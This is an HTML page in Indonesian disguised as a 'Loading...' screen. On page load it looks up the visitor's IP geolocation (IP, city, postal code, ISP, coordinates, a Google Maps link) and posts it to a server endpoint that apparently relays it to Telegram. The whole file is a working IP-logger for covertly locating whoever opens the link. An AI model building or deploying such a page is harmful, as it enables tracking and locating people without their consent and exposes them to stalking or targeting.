<!-- index.html -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3 id="status">Mohon tunggu...</h3>
  <pre id="result"></pre>

  <script>
    async function getIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
📡 IP Terdeteksi
🌐 IP: ${data.ip}
🌍 Negara: ${data.country_name}
🏙 Kota: ${data.city}, ${data.region} ${data.postal}
🛰 ISP: ${data.org}
⌚ Zona Waktu: ${data.timezone}
📌 Koordinat: ${data.latitude}, ${data.longitude}
🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}
`;

        // tampilkan ke pengguna
        document.getElementById("status").textContent = "✅ Data berhasil diambil";
        document.getElementById("result").textContent = info;

        // kirim ke server (API/send.js)
        const response = await fetch("/api/send", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ text: info })
        });

        const result = await response.json();
        console.log("Respon dari server:", result);

        if (!result.ok) {
          console.error("Gagal kirim ke Telegram:", result.error);
        }

      } catch (err) {
        document.getElementById("status").textContent = "❌ Gagal ambil data";
        console.error("Error:", err);
      }
    }

    getIP();
  </script>
</body>
</html>
